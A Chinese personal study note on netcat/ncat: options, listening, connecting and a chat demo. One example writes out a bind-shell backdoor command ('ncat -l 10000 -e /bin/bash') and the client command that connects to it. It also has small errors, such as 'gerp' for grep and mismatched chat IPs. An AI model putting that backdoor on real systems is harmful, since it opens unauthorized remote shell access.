# 学习学习学习,说三遍
## 今天学习了ncat的基本用法,列上笔记
### 小知识1,转换为base64编码:
```sh
base64
输入要转换的字符
CTRL+D
```
即可转换成功!
### 小知识2,对结果进行限制:
##### 例如  </b>
```
netstat -an | gerp x
```

输出的结果中只显示x存在的信息


---
### 正文
> nc 是一款类似于cat的工具,但是是用在网络中,拥有多种功能的CLI工具,可以在网络上读写以及重定向数据.他被设计成可以被脚本或者其他程序调用的可靠的后端工具.同时由于他能**创建任意所需的连接**,因此也是个很好的网络调试工具

既是一个**端口扫描工具，也是一款安全工具，还能是一款监测工具**，甚至可以做为一个简单的 TCP 代理。 由于有这么多的功能，它被誉为是网络界的瑞士军刀。 这是每个系统管理员都应该知道并且掌握它。

---

ncat --help  查找帮助
>   -4      强制nc只能使用IPv4地址。<br>
    -6      强制nc只能使用IPv6地址。<br>
    -D      在socket上开启debugging功能<br>
    -d      不从标准输入中读取任何消息<br>
    -h      帮助选项<br>
    -i interval<br>
            在文本行之间的发送或接受，指定一个延迟时间间隔。 也会产生多个端口间的连接有延迟时间。<br>
    -k      <br>
            强制nc保持监听其他连接，在它当前的连接完成之后。 如果和-l选项一起使用，会有错误。<br>
    -l      <br>
            通常用来指定nc监听，而不是创建一个连接到远程主机。 如果不与-p, -s或者-z选项一起使用的话，会有错误。<br>另外，如果用-w指定超时选项的
            话,会被忽略。<br>
    -n      <br>
            不使用DNS或者服务不做任何地址，主机名或者端口的查询<br>
    -p source_port<br>
            指定nc使用的源端口，来服从权限约束和授权。与-l选项一起使用会产生错误。<br>
    -r       指定源 和/或目的端口是随机选择的，而不是系统按照一个范围或者顺序          <br>
    -S      开启RFC 2385 TCP MD5签名选项。<br>
    -s source_ip_address    指定发送包的IP接口，与-l选项使用会有错误。<br>
    -T ToS  为连接指定IP的服务类型(ToS)。有效的值是令牌“lowdelay”, “throughput”, “reliability”, 或者以“0x”开头的8位的十六进制值。<br>
    -C      发送CRLF做为行尾符<br>
    -t     让nc发送RFC 854 不要和将不要响应RFC 854要或者将要的请求。这使得nc可以脚本化telnet会话过程。<br>
    -U      使用Unix Domain Sockets<br>
    -u      使用UDP替代默认的TCP选项<br>
    -v      详细信息输出模式<br>
    -w timeout  如果连接和标准输入空闲时间超过了超时时间（单位秒），那么连接就被静默关闭。<br>-w标志对-l选项没影响，比如nc将要永久监听一个连接             ，使用或者不使用-w标志都可以。默认是没有超时的。<br>
    -X proxy_version<br>                        
            与代理服务器交互时的请求，nc必须使用指定的协议。支持的协议是“4” (SOCKS v.4), “5” (SOCKS v.5)和“connect” (HTTPS proxy)。 如果协议不指定，SOCKS版本5将被使用。<br>
    -x proxy_address[:port]<br>
             请求时，nc必须连接一个使用代理地址和端口的代理做为主机名。如果端口没有被指定，那么众所周知的端口将为代理协议所使用（1080 for SOCKS, 3128 for HTTPS）<br>
    -z  指定nc只是扫描监听进程，不发送任何数据给它们。与-l选项一起使用会有错误<br>

---

#### 举例1:
***-l选项***
通过 -l选项,可以进入监听模式,使我们可以在指定端口监听入站链接
完整命令如下:
```
nc -l port_number 
```
例如
```
nc -l 8080
```
服务器就开始监听8080端口
使用CTRL+C中断

#### 举例2:
***利用nc命令来连接远程系统***

```
nc IP_address Port_number
```

#### 举例3:
***连接UDP端口***
默认情况下 nc创建链接只会使用TCP端口,但是通过-u选项来连接UDP端口
```
nc -l -u 1234
```

#### 举例4:
nc 命令还可以用来在系统中创建后门，并且这种技术被黑客大量使用。 为了保护我们的系统，我们需要知道它是怎么做的。
创建后门的命令为：
```
ncat -l 10000 -e /bin/bash
```
-e 标志将一个 bash 与端口 10000 相连。<br>
现在客户端只要连接到服务器上的 10000 端口就能通过 bash 获取我们系统的完整访问权限：<br>
```
ncat 192.168.1.100 10000
```

#### 举例5:
***-c***进行端口转发
```
nc -u -l 80 -c 'nc -u -l 8080'   //尚未实现
```
#### 利用nc 进行模拟聊天
在被监听的机器（ip：10.0.2.15）上打开侦听端口 333
```
nc -lp 333
```
另一台监听机器（同一台也可以） 输入
```
nc -nv 10.2.2.15 333
```
如果系统提示
```
(UNKNOWN) [10.0.2.15] 333 (?) open
```
则表明可以正常进行  在任意机器上输入文字即可将文字输出到两个机器
